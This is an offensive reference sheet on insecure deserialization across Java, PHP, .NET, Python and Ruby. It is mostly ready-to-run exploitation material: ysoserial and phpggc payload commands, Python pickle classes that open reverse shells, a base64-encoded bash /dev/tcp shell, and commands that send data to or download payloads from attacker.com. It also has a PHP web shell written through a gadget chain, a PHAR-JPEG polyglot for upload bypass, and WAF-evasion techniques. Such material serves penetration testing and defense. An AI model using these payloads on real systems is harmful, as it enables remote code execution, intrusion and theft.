# Insecure Deserialization Reference

## Detection — Identifying Serialized Data

### Signatures by Language

| Format | Indicator |
|--------|-----------|
| Java | Hex `AC ED 00 05` / Base64 starts with `rO0AB` |
| PHP | `O:<len>:"ClassName":<fields>:{...}` or `a:<len>:{...}` |
| .NET BinaryFormatter | Base64 starts with `AAEAAAD/////` |
| Python pickle | Opcodes `\x80\x04\x95` (protocol 4+), `\x80\x03` (protocol 3) |
| Ruby Marshal | `\x04\x08` magic bytes |
| Node.js node-serialize | `{"_$$ND_FUNC$$_` prefix |

### Where to Look

- Cookies (especially non-standard names like `JSESSIONID`, `__VIEWSTATE`, `ci_session`)
- HTTP headers (`X-*` custom headers, `Authorization` bearer tokens)
- POST bodies with `Content-Type: application/x-java-serialized-object`
- Hidden form fields, URL parameters with base64 blobs
- WebSocket messages, message queue payloads
- File uploads (PHAR, serialized job objects)
- Redis/Memcached cached session data

### Quick Detection Commands

```bash
# Scan for Java serialized objects in HTTP traffic (Burp export / pcap)
grep -rl "rO0AB" ./proxy_history/
grep -rl "AAEAAAD" ./proxy_history/

# Hex check for Java magic bytes
xxd file.bin | head -1
# Look for: ace d 0005

# Decode and inspect base64 cookie
echo "rO0ABXNyABFqYXZhLn..." | base64 -d | xxd | head

# PHP serialized data detection
grep -oP 'O:\d+:"[^"]+":\d+:{' response.txt
```

---

## Quick Wins — Attribute Manipulation

### PHP Object Attribute Tampering

```php
// Original cookie (base64-decoded):
O:4:"User":2:{s:8:"username";s:6:"carlos";s:7:"isAdmin";b:0;}

// Tampered (change isAdmin to true):
O:4:"User":2:{s:8:"username";s:6:"carlos";s:7:"isAdmin";b:1;}

// Change access_level integer:
// s:12:"access_level";i:1;  →  s:12:"access_level";i:99;

// IMPORTANT: Update string lengths when changing values!
// s:6:"carlos" → s:5:"admin" (length 6→5)
```

### PHP Type Juggling via Deserialization

```php
// Vulnerable pattern: loose comparison after unserialize
$login = unserialize($_COOKIE['auth']);
if ($login['password'] == $password) { /* auth success */ }

// Exploit: set password to integer 0
// On PHP 7.x: 0 == "any_string_not_starting_with_number" → TRUE
// Payload: a:2:{s:8:"username";s:5:"admin";s:8:"password";i:0;}

// PHP 8.x: 0 == "string" now returns FALSE
// But: 5 == "5 of something" still TRUE (all PHP versions)
// So if real password starts with a digit, use that digit as integer

// Also exploitable with NULL:
// NULL == "" → TRUE (empty password bypass)
// Payload: a:2:{s:8:"username";s:5:"admin";s:8:"password";N;}
```

### Java Object Attribute Tampering

```bash
# Decode base64 session → modify with SerializationDumper
java -jar SerializationDumper.jar -r base64_session.txt

# Look for: boolean isAdmin = false → change to true
# Look for: int role = 0 → change to 1 (admin)
# Re-serialize and re-encode

# Tool: https://github.com/NickstaDB/SerializationDumper
```

---

## Java Deserialization

### Common Vulnerable Endpoints

```
/invoker/JMXInvokerServlet          (JBoss)
/jmx-console/                       (JBoss)
/web-console/Invoker                (JBoss)
/servlet/ConsoleServlet              (WebLogic)
/wls-wsat/CoordinatorPortType       (WebLogic CVE-2017-10271)
/_async/AsyncResponseService         (WebLogic CVE-2019-2725)
/console/css/%252e%252e/            (WebLogic CVE-2020-14882)
/axis2/services/                    (Apache Axis2)
/jenkins/cli                        (Jenkins)
/status                             (Spring Boot Actuator)
/actuator/env                       (Spring Boot)
/spring/gateway/routes              (Spring Cloud Gateway)
```

### ysoserial — Payload Generation

```bash
# Install
git clone https://github.com/frohoff/ysoserial.git
cd ysoserial && mvn clean package -DskipTests

# Generate payloads
java -jar ysoserial.jar CommonsCollections1 'ping -c 1 attacker.com' > payload.bin
java -jar ysoserial.jar CommonsCollections5 'curl http://attacker.com/$(whoami)' > payload.bin
java -jar ysoserial.jar CommonsCollections6 'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMC80NDMgMD4mMQ==}|{base64,-d}|{bash,-i}' > payload.bin

# Spring-specific
java -jar ysoserial.jar Spring1 'touch /tmp/pwned' > payload.bin
java -jar ysoserial.jar Spring2 'id' > payload.bin

# Hibernate
java -jar ysoserial.jar Hibernate1 'whoami' > payload.bin

# JRMP listener (two-stage)
java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections5 'id'
java -jar ysoserial.jar JRMPClient 'attacker:1099' > payload.bin
```

### Gadget Chains (Common)

- **CommonsCollections1-7** — Apache Commons Collections (most common)
- **CommonsBeanutils1** — Commons BeanUtils
- **Spring1/Spring2** — Spring Framework
- **Hibernate1/Hibernate2** — Hibernate ORM
- **Groovy1** — Groovy runtime
- **JBossInterceptors1** — JBoss/WildFly
- **Jdk7u21** — JDK native (no external libs needed)
- **URLDNS** — DNS lookup only (safe for detection, no RCE)

### Exploitation Examples

```bash
# JBoss JMXInvokerServlet
curl -X POST --data-binary @payload.bin \
  -H "Content-Type: application/x-java-serialized-object" \
  http://target:8080/invoker/JMXInvokerServlet

# WebLogic T3 protocol
python3 weblogic_t3.py -t target -p 7001 -f payload.bin

# Jenkins CLI (pre-auth)
python3 jenkins_deser.py http://target:8080/ payload.bin

# Spring Boot Actuator (if exposed)
curl -X POST http://target/actuator/env \
  -H "Content-Type: application/json" \
  -d '{"name":"spring.cloud.bootstrap.location","value":"http://attacker/evil.yml"}'

# URLDNS detection (safe — only triggers DNS)
java -jar ysoserial.jar URLDNS 'http://deser-test.burpcollaborator.net' | base64 -w0
```

### marshalsec — Alternative Exploitation

```bash
# Start JNDI/RMI/LDAP reference server
java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer "http://attacker:8888/#Exploit"
java -cp marshalsec.jar marshalsec.jndi.RMIRefServer "http://attacker:8888/#Exploit"

# Useful for JNDI injection chains (Log4Shell style)
```

---

## PHP Deserialization

### Magic Methods (Exploitation Targets)

```php
__wakeup()    // Called on unserialize()
__destruct()  // Called when object is destroyed
__toString()  // Called when object used as string
__call()      // Called on inaccessible method
__get()       // Called on inaccessible property read
__set()       // Called on inaccessible property write
__invoke()    // Called when object used as function
```

### POP Chain Construction

```php
// Example: File write via __destruct
class Logger {
    public $logFile = '/var/www/html/shell.php';
    public $logData = '<?php system($_GET["cmd"]); ?>';
}

// Serialize
$payload = serialize(new Logger());
// O:6:"Logger":2:{s:7:"logFile";s:29:"/var/www/html/shell.php";s:7:"logData";s:34:"<?php system($_GET["cmd"]); ?>";}

// URL-encoded for injection
$encoded = urlencode($payload);
```

### phpggc — PHP Gadget Chain Generator

```bash
# List available chains
phpggc -l

# Generate payloads
phpggc Laravel/RCE1 system 'id' -b                    # Base64
phpggc Symfony/RCE4 exec 'id' -u                       # URL-encoded
phpggc Monolog/RCE1 exec 'whoami'                      # Raw
phpggc WordPress/RCE1 system 'cat /etc/passwd'         # WordPress
phpggc Guzzle/RCE1 system 'id'                         # Guzzle HTTP
phpggc Doctrine/RCE2 system 'id'                       # Doctrine ORM
phpggc ThinkPHP/RCE1 system 'id'                       # ThinkPHP
phpggc Yii/RCE1 exec 'id'                              # Yii Framework

# PHAR generation (for file operation sinks)
phpggc Monolog/RCE1 exec 'id' -p phar -o exploit.phar

# With fast-destruct (bypass __wakeup checks)
phpggc Laravel/RCE1 system 'id' -f
```

### phar:// Wrapper Exploitation

When `unserialize()` isn't directly reachable but file operations are:

```php
// Any of these file functions trigger phar:// deserialization:
file_exists('phar://uploads/evil.phar')
file_get_contents('phar://...')
fopen('phar://...')
is_dir('phar://...')
stat('phar://...')
md5_file('phar://...')
getimagesize('phar://...')  // Image upload + PHAR polyglot
```

```bash
# Create PHAR polyglot (valid JPEG + PHAR)
phpggc Monolog/RCE1 exec 'id' -p phar -o exploit.phar
# Prepend JPEG header to bypass upload filters
python3 -c "
import sys
jpeg_header = b'\xff\xd8\xff\xe0'
with open('exploit.phar','rb') as f: phar = f.read()
with open('exploit.jpg','wb') as f: f.write(jpeg_header + phar)
"

# Trigger via path traversal or SSRF
curl "http://target/image?file=phar://uploads/exploit.jpg/test"
```

### Common Vulnerable Patterns

```php
// Direct unserialize of user input
$data = unserialize($_COOKIE['session']);
$data = unserialize(base64_decode($_POST['data']));

// Laravel encrypted cookies (if APP_KEY leaked)
// Magento (multiple CVEs)
// WordPress plugins with serialize/unserialize
// Joomla session handling
```

---

## .NET Deserialization

### Dangerous Formatters

- `BinaryFormatter` (most dangerous, deprecated)
- `SoapFormatter`
- `NetDataContractSerializer`
- `ObjectStateFormatter` (ViewState)
- `LosFormatter`
- `JavaScriptSerializer` with TypeNameHandling
- `Json.NET` with `TypeNameHandling.All`
- `XmlSerializer` (limited but exploitable)

### ViewState Exploitation

```bash
# If ViewState MAC validation is disabled or key is known
# Check for __VIEWSTATE field in forms

# Detect unprotected ViewState
# Look for: enableViewStateMac="false" in web.config
# Or: <pages viewStateEncryptionMode="Never">

# ysoserial.net ViewState payload
ysoserial.exe -p ViewState -g TextFormattingRunProperties \
  -c "cmd /c ping attacker.com" \
  --validationalg="SHA1" \
  --validationkey="KEY_HERE" \
  --generator="GENERATOR_VALUE" \
  --viewstateuserkey="USER_KEY" \
  --isdebug

# Without MAC validation (rare but devastating)
ysoserial.exe -p ViewState -g TypeConfuseDelegate \
  -c "powershell -enc BASE64PAYLOAD"
```

### ysoserial.net

```powershell
# Generate payloads
ysoserial.exe -g ObjectDataProvider -f BinaryFormatter -c "calc.exe"
ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c "cmd /c whoami > C:\out.txt"
ysoserial.exe -g PSObject -f BinaryFormatter -c "powershell IEX(New-Object Net.WebClient).DownloadString('http://attacker/shell.ps1')"
ysoserial.exe -g WindowsIdentity -f BinaryFormatter -c "cmd /c ping attacker.com"
ysoserial.exe -g TextFormattingRunProperties -f BinaryFormatter -c "cmd /c certutil -urlcache -f http://attacker/shell.exe C:\Windows\Temp\shell.exe"

# Json.NET specific
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "calc.exe"

# Available gadgets: ActivitySurrogateSelector, ObjectDataProvider,
# PSObject, TextFormattingRunProperties, TypeConfuseDelegate,
# WindowsIdentity, WindowsClaimsIdentity, etc.
```

### Common .NET Targets

```
# Exchange Server (ProxyShell chain)
/ecp/default.aspx (ViewState)
/owa/auth.owa

# SharePoint
/_layouts/15/picker.aspx

# ASP.NET apps with BinaryFormatter in:
- Session state (out-of-proc)
- Cache serialization
- SignalR
- WCF services
- Remoting endpoints (.rem, .soap)
```

---

## Python Pickle

### RCE via __reduce__

```python
import pickle
import base64
import os

class RCE:
    def __reduce__(self):
        return (os.system, ('curl http://attacker.com/$(whoami)',))

# Generate payload
payload = pickle.dumps(RCE())
print(base64.b64encode(payload).decode())

# Alternative: reverse shell
class RevShell:
    def __reduce__(self):
        import subprocess
        return (subprocess.Popen, (
            ['bash', '-c', 'bash -i >& /dev/tcp/10.10.14.10/4444 0>&1'],
        ))

payload = pickle.dumps(RevShell())
```

### Advanced Pickle Payloads

```python
# Multi-command execution
import pickle, base64

class MultiExec:
    def __reduce__(self):
        return (eval, ("__import__('os').popen('id').read()",))

# Pickle that evades basic signature detection
import pickletools
payload = pickle.dumps(MultiExec(), protocol=2)
pickletools.dis(payload)  # Inspect opcodes

# Using exec for complex payloads
class Complex:
    def __reduce__(self):
        return (exec, ("""
import socket,subprocess,os
s=socket.socket()
s.connect(('10.10.14.10',4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(['/bin/bash','-i'])
""",))

print(base64.b64encode(pickle.dumps(Complex())).decode())
```

### Common Vulnerable Patterns

```python
# Flask session cookies (if SECRET_KEY is known/weak)
# Uses itsdangerous + pickle
flask-unsign --decode --cookie 'SESSION_COOKIE'
flask-unsign --sign --cookie "{'user':'admin'}" --secret 'LEAKED_KEY'

# Celery task serialization (if pickle serializer enabled)
# Redis/RabbitMQ with pickle messages

# PyYAML unsafe load
yaml.load(user_input)  # RCE via !!python/object/apply:os.system

# Numpy load (pickle under the hood)
numpy.load('untrusted.npy', allow_pickle=True)

# Pandas
pandas.read_pickle('untrusted.pkl')

# Scikit-learn model files (joblib uses pickle)
joblib.load('model.pkl')
```

### PyYAML Exploitation

```yaml
# RCE via PyYAML (yaml.load without SafeLoader)
!!python/object/apply:os.system ['curl http://attacker.com']
!!python/object/apply:subprocess.check_output [['id']]
!!python/object/new:subprocess.check_output [['whoami']]
```

---

## Detection Evasion & WAF Bypass

### Java

```bash
# Use different protocol versions
java -jar ysoserial.jar CommonsCollections5 'id' | python3 -c "
import sys; data=sys.stdin.buffer.read(); sys.stdout.buffer.write(data)
" > payload.bin

# JRMP two-stage (payload never hits WAF directly)
# Stage 1: Small JRMP client stub passes WAF
# Stage 2: Full payload delivered via JRMP callback
java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections6 'id'
java -jar ysoserial.jar JRMPClient 'attacker:1099' > small_payload.bin

# Wrap in different serialization formats
# XML (XStream) instead of binary Java serialization
# JSON (Jackson/Fastjson) with polymorphic typing

# Use less common gadget chains that aren't in WAF signatures
# Jdk7u21, BeanShell1, Clojure, Groovy1

# Encode payload in unexpected locations
# - Chunked transfer encoding
# - Multipart boundaries
# - Nested encoding (base64 inside URL encoding)
```

### PHP

```php
// Fast destruct — bypass __wakeup by corrupting object count
// Change O:4:"Test":1:{...} to O:4:"Test":2:{...}
// (property count mismatch triggers fast destruct path, skipping __wakeup)

// Use S: (escaped string) instead of s: (standard string)
// S:3:"\61\62\63" == s:3:"abc"

// Case sensitivity bypass
// o:4:"Test" (lowercase o) in some PHP versions

// PHAR polyglots bypass file extension checks
// Combine with: tar, zip, jpg, gif, png headers
```

```bash
# phpggc with fast-destruct to bypass __wakeup
phpggc -f Laravel/RCE1 system 'id'

# ASCII encoding to bypass binary filters
phpggc Monolog/RCE1 exec 'id' -a

# PHAR as different file types
phpggc Monolog/RCE1 exec 'id' -p phar -pp jpeg -o exploit.jpg
phpggc Monolog/RCE1 exec 'id' -p phar -pp tar -o exploit.tar
```

### .NET

```bash
# Use alternative formatters that may not be monitored
# SoapFormatter instead of BinaryFormatter
ysoserial.exe -g TextFormattingRunProperties -f SoapFormatter -c "cmd /c whoami"

# DataContractSerializer with known types
# LosFormatter for ViewState-like scenarios

# Encode payloads in unexpected content types
# application/soap+xml instead of application/octet-stream
```

### Python

```python
# Use higher pickle protocols (less recognizable signatures)
payload = pickle.dumps(RCE(), protocol=4)  # Protocol 4/5 less commonly signatured

# Hand-craft pickle opcodes to avoid pattern matching
import pickletools
# Build custom opcode sequences that achieve same result
# but don't match known payload signatures

# Split payload across multiple pickle operations
# Use pickle's STACK_GLOBAL instead of REDUCE

# Base64 + zlib compression
import zlib, base64
compressed = base64.b64encode(zlib.compress(pickle.dumps(RCE())))
```

---

## Ruby Marshal Deserialization

### Detection

```ruby
# Magic bytes: \x04\x08
# Common locations: cookies (Rails session), Redis-backed sessions, Sidekiq jobs

# Rails secret_key_base leaked → forge session cookies
# Check: config/secrets.yml, config/credentials.yml.enc, ENV vars
```

### Exploitation

```ruby
# Universal Deserialisation Gadget for Ruby 2.x-3.x
# Uses ERB template evaluation via Gem::Requirement → Gem::DependencyList

require 'erb'
require 'base64'

class Exploit
  def initialize(cmd)
    @cmd = cmd
  end

  def marshal_payload
    # Gadget: Gem::Installer → ERB template
    code = "system('#{@cmd}')"
    erb = ERB.allocate
    erb.instance_variable_set(:@src, code)
    erb.instance_variable_set(:@filename, "exploit.erb")
    erb.instance_variable_set(:@lineno, 0)

    wrapper = Gem::Requirement.allocate
    wrapper.instance_variable_set(:@requirements, { erb => nil })

    Marshal.dump(wrapper)
  end
end

payload = Exploit.new("curl http://attacker.com/$(whoami)").marshal_payload
puts Base64.strict_encode64(payload)
```

```bash
# Rails cookie forgery (if secret_key_base known)
# Tool: https://github.com/mpgn/Rails-cookie-deserialization
ruby rails_cookie_deser.rb -s SECRET_KEY_BASE -p 'system("id")'

# Sidekiq job injection (if Redis accessible)
# Inject serialized job with malicious payload into sidekiq queue
redis-cli -h target LPUSH queue:default '{"class":"ActiveJob::QueueAdapters::SidekiqAdapter::JobWrapper","wrapped":"ExploitJob","args":[MARSHAL_PAYLOAD]}'
```

### Common Vulnerable Patterns

```
- Rails apps with leaked secret_key_base
- Sidekiq/Resque workers (Redis-backed job queues)
- Dalli/memcached session store with Marshal
- Any endpoint using Marshal.load() on user input
- rack-session-cookie with Marshal serializer
```

---

## Custom Gadget Chain Construction

### Methodology (Source Code Required)

```
Step 1: IDENTIFY KICK-OFF GADGET
  → Find classes with magic methods invoked during deserialization:
    - PHP: __wakeup(), __destruct()
    - Java: readObject(), readResolve(), readExternal()
    - Python: __reduce__, __reduce_ex__, __setstate__
    - Ruby: marshal_load()
    - .NET: OnDeserialization(), [OnDeserializing], [OnDeserialized]

Step 2: MAP CONTROLLABLE DATA
  → What properties/fields does the attacker control?
  → Which of those are passed to method calls?

Step 3: TRACE METHOD CHAINS
  → From kick-off, follow method invocations:
    kick-off.__wakeup() → $this->handler->close()
    → If $handler is attacker-controlled, inject object with close() that does something dangerous
    → close() → $this->store->write($this->data)
    → If $store and $data are controllable → file write!

Step 4: IDENTIFY SINK GADGET
  → Dangerous sinks to look for:
    - File operations: write, delete, include, require
    - Code execution: eval, exec, system, call_user_func
    - Database: query execution with controlled input
    - SSRF: HTTP requests with controlled URL
    - Reflection: newInstance, invoke with controlled class/method

Step 5: BUILD PAYLOAD
  → Construct serialized object that chains:
    kick-off → intermediate gadgets → sink
  → Ensure all type/length indicators are correct
  → Test locally before sending to target
```

### Example: PHP Custom Chain

```php
// Kick-off: Logger.__destruct() calls $this->handler->close()
// Intermediate: StreamHandler.close() calls $this->stream->write($this->buffer)
// Sink: FileWriter.write() writes to $this->path

class Logger {
    public $handler;  // → StreamHandler
}
class StreamHandler {
    public $stream;   // → FileWriter
    public $buffer = '<?php system($_GET["cmd"]); ?>';
}
class FileWriter {
    public $path = '/var/www/html/shell.php';
}

$chain = new Logger();
$chain->handler = new StreamHandler();
$chain->handler->stream = new FileWriter();
echo serialize($chain);
```

### Example: Java Custom Chain (Pseudocode)

```java
// Kick-off: HashMap.readObject() → calls hashCode() on keys
// Intermediate: TiedMapEntry.hashCode() → calls getValue() → calls LazyMap.get()
// Sink: LazyMap.get() → calls Transformer.transform() → Runtime.exec()

// This is essentially how CommonsCollections gadgets work
// Use GadgetInspector to discover new chains in target's classpath:
java -jar gadget-inspector.jar target-app.war
```

---

### General Bypass Techniques

```bash
# Double/triple encoding
echo payload | base64 | base64

# Chunked transfer encoding to split signatures
# Vary Content-Type headers
# Use HTTP/2 or WebSocket to deliver payloads
# Compress payloads (gzip, deflate) before sending
# Fragment across multiple parameters that get concatenated server-side

# Timing-based: send partial payload, wait, send rest
# Use HTTP request smuggling to bypass WAF entirely
```

---

## Common Vulnerable Endpoints & Patterns

### By Technology

**Java/J2EE:**
- `/invoker/JMXInvokerServlet` — JBoss
- `/jmx-console/HtmlAdaptor` — JBoss
- `/_async/AsyncResponseService` — WebLogic
- `/wls-wsat/CoordinatorPortType` — WebLogic
- `/console` — WebLogic
- `/jenkins/cli` — Jenkins (pre-2.x)
- `/axis2/services/` — Apache Axis
- Any endpoint accepting `Content-Type: application/x-java-serialized-object`
- RMI (port 1099), T3 (port 7001), IIOP

**PHP:**
- Session cookies with serialized data
- `/admin/` panels using `unserialize()` for state
- Magento (`/index.php/admin/`)
- WordPress plugins with object injection
- Laravel apps with leaked `APP_KEY`
- Any file operation accepting user-controlled paths (phar://)

**.NET:**
- `__VIEWSTATE` parameters (ASP.NET WebForms)
- `.rem` / `.soap` remoting endpoints
- WCF services with `NetDataContractSerializer`
- Exchange OWA/ECP
- SharePoint `/_layouts/` endpoints
- SignalR hubs

**Python:**
- Flask apps with weak `SECRET_KEY`
- Celery workers with pickle serializer
- ML model loading endpoints
- Jupyter notebooks (pickle in .ipynb)
- Django signed cookies (if key compromised)

### Detection Checklist

```
1. Proxy all traffic, search for:
   - Base64 blobs > 100 chars in cookies/params
   - Content-Type: application/x-java-serialized-object
   - Content-Type: application/x-www-form-urlencoded with large encoded values
   - __VIEWSTATE fields
   - Tokens that decode to structured data

2. Decode and identify format:
   - base64 -d | xxd | head → check magic bytes
   - Look for class names, type indicators

3. Test with safe payloads first:
   - Java: URLDNS chain (DNS callback only)
   - PHP: modify non-critical field, check reflection
   - .NET: DNS callback gadget
   - Python: pickle that calls socket.getaddrinfo (DNS only)

4. Escalate to RCE:
   - Identify available libraries (for gadget chain selection)
   - Generate appropriate payload
   - Deliver via identified injection point
   - Verify execution (callback, DNS, file write)
```

### Tools Summary

| Tool | Language | Purpose |
|------|----------|---------|
| ysoserial | Java | Gadget chain payload generation |
| ysoserial.net | .NET | .NET gadget chain payloads |
| phpggc | PHP | PHP gadget chain generation |
| marshalsec | Java | JNDI/RMI/LDAP reference servers |
| flask-unsign | Python | Flask session cookie manipulation |
| Burp Java Deserialization Scanner | Java | Automated detection |
| GadgetInspector | Java | Discover new gadget chains in target libs |
| JNDI-Exploit-Kit | Java | JNDI exploitation server |
| pimpmykali/pickle-payload | Python | Pickle payload generator |
